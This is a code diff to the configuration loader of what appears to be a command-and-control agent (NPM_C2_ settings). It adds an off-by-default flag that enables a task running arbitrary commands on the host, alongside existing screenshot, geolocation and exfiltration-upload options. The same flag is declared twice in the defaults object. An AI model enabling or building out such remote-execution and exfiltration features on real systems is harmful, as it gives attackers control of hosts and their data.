@@ -22,6 +22,7 @@ export const DEFAULTS = Object.freeze({
   enableScreenshot: false, // opt-in: the screenshot task captures the whole screen
   screenshotMaxWidth: 1280, // starting width for the screenshot JPEG downscale-to-fit ladder
   enableGeolocate: false, // opt-in: the geolocate task discloses the host's coarse location
+  enableExec: false, // opt-in: the exec task runs arbitrary commands on this host
   geolocateServiceUrl: '', // MLS/Google-compatible WPS endpoint; '' = WiFi-scan-only mode
   geolocateServiceKey: '', // appended as ?key= when set; keep real keys in env.sh
   uploadUrl: '', // anonymous file-share endpoint for screenshot exfil demo; '' = channel transfer
@@ -33,6 +34,7 @@ export const DEFAULTS = Object.freeze({
   maxRetries: 3,
   retryBaseDelayMs: 500,
   token: '', // only ever populated from the NPM_C2_TOKEN env var
+  enableExec: false, // opt-in: the exec task runs arbitrary commands (security boundary)
 });
 
 const LOG_LEVELS = new Set(['debug', 'info', 'warn', 'error']);
@@ -174,6 +176,9 @@ export function loadConfig(explicitPath) {
   if (process.env.NPM_C2_ENABLE_GEOLOCATE !== undefined && process.env.NPM_C2_ENABLE_GEOLOCATE !== '') {
     cfg.enableGeolocate = parseBoolFlag(process.env.NPM_C2_ENABLE_GEOLOCATE);
   }
+  if (process.env.NPM_C2_ENABLE_EXEC !== undefined && process.env.NPM_C2_ENABLE_EXEC !== '') {
+    cfg.enableExec = parseBoolFlag(process.env.NPM_C2_ENABLE_EXEC);
+  }
   if (process.env.NPM_C2_GEOLOCATE_URL !== undefined && process.env.NPM_C2_GEOLOCATE_URL !== '') {
     cfg.geolocateServiceUrl = process.env.NPM_C2_GEOLOCATE_URL;
   }
@@ -242,6 +247,7 @@ export function loadConfig(explicitPath) {
     throw new Error('screenshotMaxWidth must be an integer from 160 to 7680');
   }
   cfg.enableGeolocate = parseBoolFlag(cfg.enableGeolocate);
+  cfg.enableExec = parseBoolFlag(cfg.enableExec);
   assertServiceUrl(cfg.geolocateServiceUrl, 'geolocateServiceUrl');
   assertServiceUrl(cfg.uploadUrl, 'uploadUrl');
   if (!Array.isArray(cfg.uploadUrls)) {
